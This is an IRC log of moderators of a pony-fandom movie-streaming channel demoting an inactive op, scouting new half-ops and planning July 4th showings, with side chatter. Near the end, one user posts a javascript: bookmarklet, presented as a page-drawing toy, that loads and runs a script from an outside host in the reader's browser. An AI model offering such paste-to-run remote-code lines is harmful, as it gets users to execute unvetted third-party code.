<Ascendant> I watched 5 or more
<Ascendant> before falling asleep because of their annoyingly high voices and just the general stupidity
<Ascendant> that's just my opinion
<NightSeas> 12Hmm, that might be why so many people like it...
<Ascendant> >implying so many people like it
<prince-dari> Lol, because they do.
<Ascendant> also you guys (except for prince-dari) need to learn the meaning of bronies
<Ascendant> seriously
<NightSeas> 12Either way, I enjoy the show
<Ascendant> it's your choice
<NightSeas> 12^
<Ascendant> I don't like it but we're all different so derp
<Ascendant> See? I can be awesome times!
<Ascendant> sometimes*
<Ascendant> but anyway
<prince-dari> Sucks for the people who don't like it when it's being posted everywhere. XD
<Ascendant> so Drake, did you enjoy your mental images of Hensh flying around and being a cute pony and singing like a girl?
<NightSeas> 12lol
<Ascendant> that's quite annoying @ prince-dari
<NightSeas> 12anyway, bbl
<prince-dari> Yeah, I can imagine.

<Hipster_Brony> 8I just had a seizure, prince-dari
*Quanyails 7lols at double battles.
<prince-dari> XD
<Hipster_Brony> 8sup peanut
<Quanyails> 7Moxie increases attack even if you defeat your own ally. O_o
<Ghosties> 4Hey Peanut
<Hipster_Brony> 8I agree about all of those things, pretty much in that order too
<Hipster_Brony> 8let's make that the agenda
<Ghosties> 4Good, because I was getting a little worried last night
<Bronypeanut> 13Hai
<Bronypeanut> 13=D
<prince-dari> Hey.
<Hipster_Brony> 8dunno if you saw, but DCD's exam got moved back, so he's gonna be streaming this week
<Ghosties> 4Okay
<prince-dari> Awesome.
<Hipster_Brony> 8so thats one less thing to worry about
<Ghosties> 4Okay, Lou
<Ghosties> 4Are do you want to wait for Silver to get back?
<Ghosties> 4*Or
<Steve> 12 Hello, Stormy and welcome to #draconicwolves. To see the scripts type !command, and for information on use type: !help <script>
<Hipster_Brony> 8we can discuss it now and ask him when he gets back
<Ghosties> 4Alright
<Steve> 12 Hello, Stormy and welcome to #bronies. To see the scripts type !command, and for information on use type: !help <script>
<Ghosties> 4I say we demote him. Don't care to what, but he doesn't need to be an op
<Hipster_Brony> 8I agree
<Ghosties> 4Hell, we could demote him to just a regular user for all I care (and I'm leaning more towards this anyways)
<Hipster_Brony> 8I think he should be at least bumped down to half-ops
<Hipster_Brony> 8it was very unprofessional of him to not show up at all and not tell us he would be gone
<Ghosties> 4The worst part of it all is that I've seen Lou a few times before AND after the stream
<Ghosties> 4posting on Ponychan, I mean
<Hipster_Brony> 8me too
<Bronypeanut> 13Yeah. I apologize I had to miss it everypony
<Bronypeanut> 13:(
<Hipster_Brony> 8no problems, peanut
<Ghosties> 4Don't worry Peanut, at least you told us ahead of time
<Bronypeanut> 13This time I SHOULD be good.
<Hipster_Brony> 8it's a completely different situation
<Hipster_Brony> 8you participated in our mod meetings, informed us ahead of time and came for at least part of the pre-show
<Hipster_Brony> 8Lou basically ignored us completely
<Hipster_Brony> 8he hasn't even posted in the mod discussion thread
<Silverscreen> 12Hey, I'm here.
<Silverscreen> 12Sorry, I was busy posting.
<Ghosties> 4Yeah, so you're fine
<Ghosties> 4Lou, on the other hand, has done none of those things
<Ghosties> 4ever, I don't think
<Ghosties> 4Good to see ya, Silver
<Ghosties> 4Silver, what do you think about demoting Lou?
<Hipster_Brony> 8ok, DCD isn't gonna be in Brony State tonight
<Silverscreen> 12I haven't seen him AT ALL since the first streaming.
<Silverscreen> 12Honestly, I haven't even considered him a mod at all recently.
<Hipster_Brony> 8yeah
<Ghosties> 4Neither have I
<Hipster_Brony> 8it seems like the general consensus is that he should be at least demoted to half-ops, if not stripped of mod-ship all together
<Ghosties> 4Hipster says demote to half op, I say demote to just a regular user
<Dialga> hay guize watsup
<Hipster_Brony> 8I would actually lean towards stripping him all together
<Hipster_Brony> 8altogether*
<Armageddon> ohai
<Silverscreen> 12How about something in between. If he doesn't show up for anything involving it this week, he should lose it all. Completly, but as a last chance, we'll just bump him down to half-op this week.
<Hipster_Brony> 8it might seem a little harsh, but he clearly is not investing his time in this like the rest of us
<Hipster_Brony> 8i would be ok with that
<Ghosties> 4Yeah, that was gonna be my suggestion
<Quilava> cocks
<Armageddon> :o
<Ghosties> 4Fine, we'll bump him down to half-op BUT if he doesn't show up at all this week then he's demoted to regular user next week
<prince-dari> /list
<Hipster_Brony> 8ok
<Ghosties> 4Alright

<Ghosties> 4The idea about streaming three films
<Hipster_Brony> 8we will need to replace him
<Ghosties> 4Oh yeah, there's that too
<Skylands> 10o.o
<Ghosties> 4Is Bristle a half-op?
<Hipster_Brony> 8yeah
<Hipster_Brony> 8so is peanut
<Silverscreen> 12I'm for promoting Peanut.
<Ghosties> 4We could probably bump Peanut to full op
<Hipster_Brony> 8me too
<Silverscreen> 12He's the most active and has been quite exceptional with his modding.
<Ghosties> 4At least Peanut's been here for most of the meetings and stuff
<Ghosties> 4Yeah, most active
<Hipster_Brony> 8sounds pretty unanimous to me
<Quilava> so how is everyone?
<prince-dari> /cs help
<Hipster_Brony> 8unless DCD has any objections, which I can't imagine he would, it looks like peanut will be replacing lou as a full-op
<Silverscreen> 12Jolly good.
<Ghosties> 4DCD considers Lou an IRL friend though, doesn't he? I think it may be a bit harder to convince him
<Silverscreen> 12....why the hell did I say that?
<Hipster_Brony> 8if lou doesn't show up, we will need to recrut some more half-ops too
<Hipster_Brony> 8recruit*
<prince-dari> Could someone ask DCD if he wants me to write this script? I don't know where to find him.
<Silverscreen> 12I don't think we need to make finding ops a major consern. We've been doing pretty damn good with regulating the chat on our own, even durring the higher numbers.
<mrpibb> to play one
<Ghosties> 4Honestly, the three of us the real regulators in the stream (no offense to Peanut or Bristle). But when I think of "the mods," I think myself, Hipster, and Silver. And like Silver said, we're doing just fine at the moment.

<Hipster_Brony> 8well then
<pyroclectic> i have work to do
<pyroclectic> is there any way i can like
<Ghosties> 4Nevermind, Peanut. Just..just forget this whole conversation :P
<Hipster_Brony> 8I guess Mister Bristle would be next in line
<Ghosties> 4Yeah
<Hipster_Brony> 8and we DEFINITELY need to get more half-ops now
<Hipster_Brony> 8cuz I think we would have 1, and it would be lou
<Bronypeanut> 13*forgets the whole conversation*
<Ghosties> 4Has anyone seen anyone during the streams that they think would be eligible for half-ops?
<Silverscreen> 12Usually the streams go too fast to actually take notice. I'm too busy keepying an eye out for parasprites and rule offenders.
<Hipster_Brony> 8me too
<Angel_Espeon> 13Goodnight all :3
<Hipster_Brony> 8I wouldn't say anyone has stood out a TON
<Hipster_Brony> 8closest I can think of would probably be SirChuckles (I think that was his name)
<Ghosties> 4I have three candidates, but like you guys have said they haven't really stood out much
<Hipster_Brony> 8who are they?
<prince-dari> /whois Bronypeanut
<prince-dari> /whois Ghosties
<prince-dari> /whois Hipster_Brony
<prince-dari> /whois Silverscreen
<Ghosties> 4SirSprinkles, Razyn, and LunarTopaz
<Ghosties> 4Though, I recognize SirChuckles
<Hipster_Brony> 8I may be confusing the two of them
<Hipster_Brony> 8not 100% sure
<Ghosties> 4I've seen them both in the stream at the same time
<Hipster_Brony> 8now that you mention it, they do sound familiar
<Hipster_Brony> 8let's do this

<Hipster_Brony> 8when we stream this week, keep an eye on those users, see when they show up for pre-show, when they leave etc...
<Silverscreen> 12Alright.
<prince-dari> Since there's actually people here, does anyone know what was happening recently with secret boards?
<prince-dari> I kind of missed that.
<Hipster_Brony> 8if they're good, they contribute to the conversation and come early and stay late, I say we approach them about half-ops
*drf|laptop drops over dead
<Silverscreen> 12Also, keep an eye on the threads too. there's quite a number that seem really interested in what we're doing.
<Bronypeanut> 13I can vouch for Sir Sprinkles.
<drf|laptop> 03I just came back from working out, only shortly after I cut the grass in 90 degree weather x.x
<HyperMetalLugia> Hello DeadDanny
<Bronypeanut> 13But I don't know the other two very well
<HyperMetalLugia> .v.
<HyperMetalLugia> Ice
<HyperMetalLugia> Go to Alaska
<drf|laptop> 03I've got a fan pointed at me XD
<drf|laptop> 03and oh god
<Silverscreen> 12Prince-dari: I have no clue, to tell you the truth. I've had myself burried in /rp/ the past few days.
<Ghosties> 4I forgot about looking at the threads >_<, thanks Silver
<drf|laptop> 03not this part of Star Wars episode 2
<Hipster_Brony> 8I've seen LunarTopaz around a lot on /oat/, mostly in GET threads
<drf|laptop> 03the Anakin/Padme love scenes
<HyperMetalLugia> What is it?
<drf|laptop> 03I hate those
<HyperMetalLugia> ;o
<HyperMetalLugia> EW
<drf|laptop> 03I like the actual
<drf|laptop> 03you know
<drf|laptop> 03Jedi fighting
<Ghosties> 4Right, LunarTopaz is a frequent GETter
<HyperMetalLugia> Not bedstuff :<
<Ghosties> 4But she's one of my 'favorite' users in the stream
<drf|laptop> 03ooh, Pawn stars
<drf|laptop> 03let's watch this instead
<HyperMetalLugia> Tell them
<HyperMetalLugia> Ooooh
<Hipster_Brony> 8other people to consider would be Elky and Uberpony
<HyperMetalLugia> I love that show too :D
<Hipster_Brony> 8they comment frequently in the threads
*HyperMetalLugia hooks up his cable box agian
<HyperMetalLugia> '*again
<Hipster_Brony> 8we should keep an eye out for them in the streams
<Silverscreen> 12I know of Uberpony. In fact, he helped select one of this week's movies.
<Hipster_Brony> 8Indeed
<Ghosties> 4I'd suggest TurniBrony, but he doesn't show up for the streams much apparently
<Hipster_Brony> 8I think Elky did too
<prince-dari> Oh, what are the movies (or at least the ones selected so far)?
<Hipster_Brony> 8A Fistful of Dollars and The Room this week
<drf|laptop> 03XD
<drf|laptop> 03History Channel
<drf|laptop> 03new episode in 2 mins
<Silverscreen> 12A hoofful of dollars and the room.
<Hipster_Brony> 8lol, dat ponychan wordfilter
<prince-dari> Ok. Thanks.
<Hipster_Brony> 8it has messed up so many posts about our movies this week
<drf|laptop> 03well not "new" per se
<drf|laptop> 03apparently some new show premieres in half an hour
<Hipster_Brony> 8but yeah, I think TurniBrony was the guy who said he liked the idea but didn't come to the streams because he didn't like the movies
<HyperMetalLugia> Any name?
<Hipster_Brony> 8I would say probably not him, because he wouldn't be a particularly reliable mod
<Ghosties> 4So, SirSprinkles and Elky (even though Elky complained about Evil Dead 2 the whole time....pffff Ash is awesome)
<drf|laptop> 03Gettysburg
<Hipster_Brony> 8full disclosure, I also complained about evil dead 2 the whole time
<drf|laptop> 03but darn it
<Ghosties> 4But you're a mod
<prince-dari> Evil Dead 2 was the funniest film I've seen this year.
<drf|laptop> 03there's a watermark on the top left with a countdown
<Ghosties> 4So it doesn't bother me
<drf|laptop> 03I don't care about that show :|
<Hipster_Brony> 8but elky was here for the whole stream, right?
<Silverscreen> 12Pony chan's word filter is starting to effect my brain.
<Ghosties> 4I don't recall
<Ghosties> 4I know he was there for Evil Dead 2
<Ghosties> 4Don't know about MP though
<Hipster_Brony> 8ok
<Hipster_Brony> 8so
<Hipster_Brony> 8let's keep an eye on Sir Sprinkles, Razyn, LunarTopaz, Elky and Uberpony during this week's stream
<HyperMetalLugia> They should just split the siginal and give you the option to remove it :P
<Ghosties> 4Agreed
<Hipster_Brony> 8if they stand out, we approach them about half-ops
<Silverscreen> 12got it.
<drf|laptop> 03oh, it went away
<Ghosties> 4Do we approach them during or after streaming?
<Hipster_Brony> 8question is... how
<Ghosties> 4Exactly
<Ghosties> 4PM?
<Silverscreen> 12We are NOT beeping them like we did last time.
<Silverscreen> 12that was a mistake.
<Hipster_Brony> 8Yeah, it was the only way I knew how to find Bristle though
<Ghosties> 4Silver has a good point, by the time I was leaving the stream I checked and I had about 4 or 5 PMs waiting for me >_<;
<Ghosties> 4All from earlier parts of the stream, too
<Ghosties> 4I'd completely forgotten about it
<prince-dari> /notice > /msg
<Hipster_Brony> 8I think he means on Ponychan, right, silver?
<Ghosties> 4Oh, is that what Silver means?
<Silverscreen> 12yeah.
<Silverscreen> 12When we called for Bristle in Pony chan.
<Silverscreen> 12We got flooded with a bunch of spectators who did nothing but sit there.
<Ghosties> 4Yeah, I remember
<Hipster_Brony> 8I think posting the link was a mistake, but I also don't want to annoy the Ponychan mods with threads like that
<Hipster_Brony> 8so, I guess we can PM them after the stream?
<Silverscreen> 12I like the idea of PMing them during the stream.
<Silverscreen> 12or after.
<Hipster_Brony> 8I would say after
<Hipster_Brony> 8see if they stick around for the whole thing
<Ghosties> 4true
<prince-dari> If they stay till the films end then leave before you have a chance to PM them, sucks for you.
<Ghosties> 4Wait
<Ghosties> 4I think we're overlooking someone
<Hipster_Brony> 8brb guys, firing off some messages to ARGH and Sethisto
<Bronypeanut> 13And now we have MisterBristle
<Hipster_Brony> 8o hai Bristle
<Ghosties> 4Hello Bristle
<Hipster_Brony> 8we were just talking about you :)
<Silverscreen> 12MisterBristle

<Chimera> 04asdf
<Ghosties> 4Yeah, I always interpreted : / as "well, fuck"
<Chimera> 04Anyone here know flash? >A>
<Silverscreen> 12Woah. Alt-tab is freaky.
<Ghosties> 4ANYWAYS, let's get back on topic. Shall we?
<Silverscreen> 12yesh.
<Ghosties> 4I don't mean to rush this meeting but I've got a test to take before midnight
<Hipster_Brony> 8alright
<Hipster_Brony> 8the movies
<Silverscreen> 12What about this whole 3 movie gig we were discussing?
<Hipster_Brony> 8What are our opinons on 3 movies?
<Ghosties> 4Only for special holidays
<HyperMetalLugia> I do!
<Silverscreen> 12Holidays and special events only.
<Ghosties> 4Please, not every friday
<drf|laptop> 03I know OF it
*drf|laptop hides
<HyperMetalLugia> He was the one who was killed by Apple
*HyperMetalLugia shot
<Silverscreen> 12I'm worn out modding two movies AND two episodes, not to mention if I get in durring pre-show.
<Hipster_Brony> 8honestly, I would be fine with doing it every week, but I don't feel strongly either way
<Ghosties> 4I was in the stream Friday for at least 8 hours or so
<HyperMetalLugia> Chimera, run your project on a iPad!
<Hipster_Brony> 8provided we started earlier of course
<Ghosties> 4And I was drained when we were trhough
<Ghosties> 4*through
<Silverscreen> 12The only way I can think of making it work the best is if we cut the pre-show short and insert the movie in its place.
<Ghosties> 4Still, three movies seems a bit too much every week
<Ghosties> 4I'm afraid we'll lose people's attention during that time
<Hipster_Brony> 8that's true
<drf|laptop> 03LOL fail @ history channel
<Hipster_Brony> 8on the other hand, we would have a higher probability of getting a movie that gets a lot of interest
<HyperMetalLugia> Hmm?
<Hipster_Brony> 8since not everypony stays for the whole stream
<Hipster_Brony> 8some just come for one movie
<drf|laptop> 03they were like "new episode on Wednesday", and they were advertising the same episode that's on now
<MisterBristle> 7I know I don't
<Ghosties> 4I'd have to agree with Silver on this, where the mods would plan ahead of time for the movies we stream
<Ghosties> 4Like
<Ghosties> 4say
<Ghosties> 4If we decide to do a complete Lord of the Rings showing
*HyperMetalLugia slowclaps
<Silverscreen> 12In one go, Ghosties? HELL NO!
<Ghosties> 4Well, of course not one go :P
<Silverscreen> 12Over the course of the weekend, maybe.
<Ghosties> 4But over the course of the weekend, yeah
<Ghosties> 4But this would be something special, not something we do every week
<Silverscreen> 12Now THAT would garner a good number of ponies.
<Hipster_Brony> 8yes it would
<Hipster_Brony> 8oh, and speaking of getting a bigger audience
<Hipster_Brony> 8we should see if we can get a question in the weekly Pinkie Poll
<Ghosties> 4Hmm...yes, more exposure would be good for us
<Hipster_Brony> 8something like, "Do you watch Brony Movie Night?"
<prince-dari> Back.
<Hipster_Brony> 8with responses like, "yes, all the time"
<Hipster_Brony> 8"Sometimes"
<Hipster_Brony> 8"I have never heard of it, but would be interested"
<Silverscreen> 12...do any of you realize how much this sounds like a marketing campagn?
<Hipster_Brony> 8that kind of stuff
<Hipster_Brony> 8it does
<Hipster_Brony> 8but that's the kind of stuff we have to do
<Silverscreen> 12Alright, so I'm not the only one.
<Ghosties> 4....maybe
<Ghosties> 4Lool
<Ghosties> 4*Look
<Ghosties> 4How much are we trying to make this something that'll last?
<Steve> 12 Hello, Stormy and welcome to #draconicwolves. To see the scripts type !command, and for information on use type: !help <script>
<Hipster_Brony> 8I'm convinced that the reason we even got this off the ground was EQD
<Silverscreen> 12DCD said it'll last as long as he can stream.
<Hipster_Brony> 8I would like to make it last
<prince-dari> More people come in the stream every week.
<prince-dari> So it seems to be going well so far is all I'd say.
<Hipster_Brony> 8DCD said he wants to continue as long as he can, then pass it off to somepony else once he's done
<Steve> 12 Hello, Stormy and welcome to #bronies. To see the scripts type !command, and for information on use type: !help <script>
<Silverscreen> 12Hell, he won't even be available this week, and we STILL have a Movie Night planned.
<Ghosties> 4I think if we really try this could become pretty noteworthy
<Hipster_Brony> 8silver, he actually will be
<mib_p0siyc> whew, i see you guys changed the chat a bit.
<Hipster_Brony> 8his test got moved back
<Silverscreen> 12Really? AWESOME.
<Hipster_Brony> 8ghosties, that's what i really want to do
<Lambda> @pony
<Steve> 12Lambda is 12Soar1in'
<Hipster_Brony> 8this is kind of my baby, and i want to see it be successful
<Ghosties> 4Yeah, you suggested the idea. Right, Hipster?
<Hipster_Brony> 8yep
<Silverscreen> 12This is the first time I've ever been on a project outside of school. I'm all for it.
<Ghosties> 4Yeah, I posted in the thread
<Hipster_Brony> 8it was my 2nd day on Ponychan lol

<Ghosties> 4I posted the Fallout pip boy
<Ghosties> 4Saying I was all for the idea
<Hipster_Brony> 8ah, nice
<Silverscreen> 12I posted in the same thread. It was the week after that I made the Brony Movie Night pic.
<Hipster_Brony> 8sweet
<Ghosties> 4Look at us now lol
<prince-dari> http://i188.photobucket.com/albums/z204/prince-dari/spyro1.jpg
<prince-dari> Any of you ever played Spyro? I've been making a 3d model of him, was thinking of making a game.
<Hipster_Brony> 8lol, 1st think i thought of was Spike, actually
<prince-dari> Hahaha.
<prince-dari> Yeah, they're sort of similar.
<Silverscreen> 12Oh, get this, I'm going to be making a logo for The Daily /oat/
<Hipster_Brony> 8but yeah, one of the reasons i dove in headfirst into the community was because my suggestion was embraced so thoroughly on my 2nd day
<Hipster_Brony> 8nice, silver
<Hipster_Brony> 8unfortunately, i have not had a thread of even moderate success since then :(
<Ghosties> 4I thought it looked like Spyro...
<Ghosties> 4And congratulations, Silver :D
<Silverscreen> 12Thanks.
<Silverscreen> 12I have yet to make any thread that broke 100 posts outside of the Movie Night threads.
<Hipster_Brony> 8oh wow, just looked at my message about it looking like Spike...
<Hipster_Brony> 8English fail
<prince-dari> Haha.
<Ghosties> 4I've only posted four threads
<Silverscreen> 12I thought it looked like Spyro first.
<Ghosties> 4on Ponychan
<Silverscreen> 12Didn't think of Spike until you said something.
<Hipster_Brony> 8lol, silver, I don't I've broken 10 replies on any non-BMN related thread ever
<Silverscreen> 12...our chat has derailed considerably.
<Hipster_Brony> 8eyup
<prince-dari> I just got a tripcode for ponychan, I haven't posted other than anon so far.
<Hipster_Brony> 8ok, so it sounds like we are in favor of only doing more than 2 movies on special occasions
<Hipster_Brony> 8let's discuss July 4th then
<Silverscreen> 12We have to do that BEFORE The actual 4th
<Hipster_Brony> 8I'll be available all day on the 4th
<Ghosties> 4I did some math for the Band of Brothers showing
<Hipster_Brony> 8epically long
<Ghosties> 4and it'll be about 11 hours and 45 minutes long
<Ghosties> 4total
<Silverscreen> 12HOLY HELL
<Ghosties> 4Yeah
<prince-dari> Hm.
<Ghosties> 4Yeeeeaaaaaaaahhhhhh
<Hipster_Brony> 8I was thinking about doing it over the course of the weekend
<Ghosties> 4I don't know, man
<Ghosties> 4Well
<Silverscreen> 12There's an idea.
<Ghosties> 4...maybe over the weekend
<Hipster_Brony> 8split it up into 4 hour blocks, on Saturday, Sunday and Monday
<Silverscreen> 12Split it in two for the Sat. and Sun. before.
<Silverscreen> 12or that.
<Hipster_Brony> 8or
<Hipster_Brony> 8we could do two 6 hour blocks on saturday and sunday, and then show saving private ryan or something on the actual 4th
<Lambda> http://www.ponychan.net/chan/oat/src/130680395964.jpg
<prince-dari> Even the normal Friday streams end at about 8AM for me, screws up my sleep pattern so badly. XD
<Stormy> lol
<Ghosties> 4I agree with the first idea
<prince-dari> Around 8 anyway.
<Hipster_Brony> 8are you a euro-brony, prince-dari?
<prince-dari> Yep.
<prince-dari> UK
<Hipster_Brony> 8Do you know how to stream stuff?
<prince-dari> I could work it out in an hour.
<prince-dari> :P
<Silverscreen> 12I'm telling you, we won't have that big of a turnout on the 4th
<Silverscreen> 12at least not with the American bronies.
<drf|laptop> 03LOL @ Family Guy
<drf|laptop> 03"You dated a black guy? That's a lot to take in" "I'll say!" "...shut up"
<Hipster_Brony> 8ok, because we had discussed getting somepony in europe to do a companion stream of the same stuff at a time that would work better for euro-bronies
<Ghosties> 4I think three nights, showing four hours a piece would be good. Then again, as Silver said, I don't think we'll get that many people to show up
<Hipster_Brony> 8that's why I was thinking Saving Private Ryan or something
<Ghosties> 4You know, let's just do that?
<Ghosties> 4Saving Private Ryan, I mean?
<Hipster_Brony> 8just show that movie?
<Ghosties> 4WAIT
<Ghosties> 4I KNOW
<Ghosties> 4I GOT IT
<Ghosties> 4Saving Private Ryan for the A movie
<Hipster_Brony> 8i think we may be having a herd mind ghosties
<Ghosties> 4and then Independence Day for the bad movie
<Hipster_Brony> 8that's more or less what I was thinking
<Silverscreen> 12If it's the weekend, we'll be good. But trying to get ponies here ON THE 4TH would be a hassle, since most will be spending it with their families.
<Hipster_Brony> 8here's an idea I literally just had
<Hipster_Brony> 8for the 4th
<Hipster_Brony> 8we do the selection thread like normal, but have more movies, and over the course of the weekend, but not july 4th
<Hipster_Brony> 8with the stipulation that the movies be war-related
<Hipster_Brony> 8or america related
<drf|laptop> 03Hahahaha
<drf|laptop> 03Family Guy just made funny of the OSX loading spiral thing
<Lambda> @pony
<Steve> 12Lambda is 0,1Z1,0e0,1c1,0o0,1r1,0a
<Hipster_Brony> 8So we could end up showing Saving Private Ryan, Independence Day, The Patriot, etc... over the course of the weekend
<Silverscreen> 12Independence Day and Saving Private Ryan sound good to me, but having a selection for Friday is a good idea too.
<Silverscreen> 12But then what do we do about Band of Brothers.
<Silverscreen> 12?*
<prince-dari> @pony
<Steve> 12prince-dari is 10Trix11ie
<prince-dari> D:
<Ghosties> 4Just forget about it?
<Hipster_Brony> 8yeah, it might be a bad idea
<Ghosties> 4I think Saving Private Ryan and Independence Day would get more turnout
<Hipster_Brony> 8it's just too dan long
<Hipster_Brony> 8damn*
<Lambda> The Great and Powerful Dari
<Silverscreen> 12good point.
<prince-dari> Hahaha.
<Lambda> hey guess what
<prince-dari> What?
<prince-dari> Oh yeah, I forgot to tell you guys about some really cool thing I found
<Ghosties> 4Okay, so, what's the plan? Do we actually show SPR and ID?
<Lambda> I finally saw all the episodes
<prince-dari> Oh, did you watch more than one a night?
<Lambda> Yeah
<Ghosties> 4I know Hipster suggested his plan, but what does the other mods think?
<Lambda> Stormy was over so we had a marathon
<prince-dari> javascript: (function () {if (window.goggles && window.goggles.active) {window.goggles.stop();} else {window.GOGGLE_SERVER='http://goggles.sneakygcr.net/page';var scr = document.createElement('script');scr.type = 'text/javascript';scr.src = 'http://goggles.sneakygcr.net/bookmarklet.js?rand='+Math.random();document.documentElement.appendChild(scr);}})();
<Lambda> what is that? O.o
<prince-dari> That javascript shows up anything anyone has drawn on a web page, and lets you draw on a apge.
<prince-dari> page*
<Silverscreen> 12I like that plan. Toss out BoB and do those two over the weekend.
<Silverscreen> 12And due the usual 2 movie selection for Friday.
<prince-dari> It's pretty awesome.
<Ghosties> 4Yeah, sounds great
<prince-dari> Go to SF homepage and use it.
<Silverscreen> 12do*
<prince-dari> I wrote ponies on it. XD
<Silverscreen> 12grammar fail.
<Lambda> how do I use it?
<Ghosties> 4So the mods have their movies picked for the special event, but the bronies get to pick their movies for the regular movie night
<prince-dari> Clear the URL bar on the page you want to use it, paste it in, press enter.
<Hipster_Brony> 8i like that idea
<Silverscreen> 12That idea works.
<Hipster_Brony> 8question is, which days?
<Ghosties> 4Friday would be movie night like regular
<Hipster_Brony> 8do we do friday and saturday?
<Lambda> woah
<Ghosties> 4Sat and Sunday would be the special days?
<Ghosties> 4Or just sat or Sunday?
<prince-dari> Haha.
<Silverscreen> 12I like the idea of Sat and SUn.
<prince-dari> Cool right?
<Hipster_Brony> 8so we would show one each day?
<Silverscreen> 12It's only one movie each, so we wouldn't be up as late.
<Ghosties> 4True
<prince-dari> Paste it in again on the same page to turn it off.
<Silverscreen> 12Plus, no ponies those days outside of PMV preshow.
<Hipster_Brony> 8here's another question
<Hipster_Brony> 8what do we do if somepony suggests one of those movies before the 4th?
<Ghosties> 4...
<Ghosties> 4shit
<prince-dari> Tell them to choose another?
<prince-dari> :P
<Hipster_Brony> 8like say next week somepony suggests Indpendence day
<Lambda> I wrote "Ponies FTW!"
<Silverscreen> 12we out and tell them our plans. We gotta let them know anyway.
<Ghosties> 4Oh yeah, why don't we just tell them that we'll be showing a special 4 of July and tell them anyways?
<prince-dari> XD
<Hipster_Brony> 8ok, fair enough
<Silverscreen> 12It's better to be upfront than to wait for it to be a problem.
<Hipster_Brony> 8I wouldn't mind keeping it a secret a little while longer though
<Ghosties> 4Exactly, plus, I don't like keeping our other bronies in the dark like that
<Silverscreen> 12alright, how about we wait until the week BEFORE that, since the suggestions won't be made until then anyway.
<Hipster_Brony> 8excuse me for one moment guys, I'm gonna compose an email to Sethisto quick
<Ghosties> 4Alright, Hipster
<prince-dari> /j #faodsajlkfasdlj
<prince-dari> [02:14] <Lambda> @pony
<prince-dari> [02:14] <Steve> Lambda is Zecora
<Silverscreen> 12You do that.
<Ghosties> 4Wait until the week before what?
<Ghosties> 4Before the special showing?
<Silverscreen> 12yes.
<Ghosties> 4*nods* I don't mind that
<Silverscreen> 12The week of the showing, we'd deffinatly will get those requests. but before then, it's not likely to happen.
<prince-dari> [02:14] <Steve> 12Lambda is 0,1Z1,0e0,1c1,0o0,1r1,0a
<Silverscreen> 12So we'll wait until then to tell them. still a surprise but keeps it from causing trouble.
<Ghosties> 4Alright, so we let them know what our showing will be the week before the weekend of the 4th?
<prince-dari> [02:14] <Lambda> @pony [02:14] <Steve> 12Lambda is 0,1Z1,0e0,1c1,0o0,1r1,0a
<Silverscreen> 12exactly.
<prince-dari> Yay, pony scripts. :D
<prince-dari> [02:14] <Lambda> @pony [02:14] <Steve> 12Lambda is 0,1Z1,0e0,1c1,0o0,1r1,0a
<Stormy> that is awesome
<Ghosties> 4Alright
<Ghosties> 4well
<Chimera> 04Quanyails
<Chimera> 04I need you :c
<Ghosties> 4I think we have all the topics for the meeting addressed
<prince-dari> [02:09] <Hipster_Brony> Do you know how to stream stuff? I've worked it out by the way.
<Lambda> http://tinypic.com/r/4hwhp3/7
<prince-dari> LOL how much of that was already there?
<Ghosties> 4Lou will be demoted to half-op and this week will be his last chance and if he doesn't show up this time then he's stripped completely.
<Lambda> none
<Lambda> it was all me
<prince-dari> Hahahaha.
<Lambda> I couldn't see anyone's but my own
<Ghosties> 4Three films will be saved for special holidays and events
<Stormy> XD
<Ghosties> 4And the 4th of the July will be Saving Private Ryan and Independence Day

<Silverscreen> 12It'd just be all around awesome.
<Silverscreen> 12And the movies by themselves are long enough to last a night each.
<prince-dari> How many people over 200 came last time (wondering what the record to beat is).
<Ghosties> 4I don't recall
<prince-dari> Should set up something to keep track of the max number of people in here.
<Ghosties> 4But on the topic of LotR
<HyperMetalLugia> Ohai Hot_Latias
<Ghosties> 4We'd have to show one movie a night
<HyperMetalLugia> :P
<Ghosties> 4Because each film is about three hours in length
<Silverscreen> 12We had a max of 228 during Holy Grail.
<Light_Latias> XD

<Silverscreen> 12Ponychan has no official IRC

<Light_Latias> it feels like it x3x
<Silverscreen> 12If Ponychan had an official place, it'd be quite popular for people who aren't into image boards.
*Light_Latias hides

<prince-dari> Yeah.

<prince-dari> We could do with some traffic.

<prince-dari> It should stay. XD
<HyperMetalLugia> Did LL have another :o
<Ghosties> 4Are you suggesting that we make an IRC as an offshoot to the Brony Movie Night?
<HyperMetalLugia> I see
<prince-dari> When you next come back and activate it, unless someone else rubs it off.
<Light_Latias> wait
<Light_Latias> what

<Silverscreen> 12...damn you wordfilter. Main*
<prince-dari> Lawl.
<Ray> 02Pirates of the Caribbean 4
<Ghosties> 4So what do you have in mind? I mean, we can't all be moderating the channel all the time
<HyperMetalLugia> Same here :P
<HyperMetalLugia> Great movie huh?
<Ray> 02Yep
<Light_Latias> blah u all
<HyperMetalLugia> Blah U LL
<HyperMetalLugia> :>
<prince-dari> That's what bots are for. :P
<Ray> 02D:
<Light_Latias> ;-;
<Chimera> 04:c
<HyperMetalLugia> Hmm?
<HyperMetalLugia> :<
<Silverscreen> 12Oh, god no. I'd say we bring the idea up on /oat/ (or /chat/ if we have to) and see what kind of support it draws up. If we're lucky, we'll get people offering to be a part of it, just like we did for this.
<Hipster_Brony> 8im back yo
<Hipster_Brony> 8just sent the email to Sethisto
<Silverscreen> 12Sweet.
<Ghosties> 4Okay, so, lay it down for me...er, Hipster too -_^
<Hipster_Brony> 8Also, we need to make sure we put in a content warning for The Room
<Hipster_Brony> 8there's nudity and sex scenes in it
<prince-dari> I worked out how to stream stuff BTW if it's ever needed Hipster_Brony.
<Silverscreen> 12Yeah. Tommy Wesau's flank. that's enough to make an R movie on its own.
<Hipster_Brony> 8ok, sweet, I'll get DCD to talk to you when we have our next mod meeting about logistics and such
<prince-dari> http://www.spyroforum.com/user-2204.html
<prince-dari> Go to RDX's profile page.
<prince-dari> Turn it on.
<prince-dari> What do you see?
<Ghosties> 4Anyways, Hipster, Silver has mentioned an idea
<Steve> 12 Hello, Mikey and welcome to #bronies. To see the scripts type !command, and for information on use type: !help <script>
<Steve> 12 Hello, Mikey and welcome to #draconicwolves. To see the scripts type !command, and for information on use type: !help <script>
<Lambda> Mikey
<Mikey> hi
<prince-dari> Hey Mikey.
<Lambda> sup
<Mikey> hi
<Lambda> we're drawing pony graffiti on SF
<prince-dari> Go to RDX's profile page.
<prince-dari> javascript: (function () {if (window.goggles && window.goggles.active) {window.goggles.stop();} else {window.GOGGLE_SERVER='http://goggles.sneakygcr.net/page';var scr = document.createElement('script');scr.type = 'text/javascript';scr.src = 'http://goggles.sneakygcr.net/bookmarklet.js?rand='+Math.random();document.documentElement.appendChild(scr);}})();
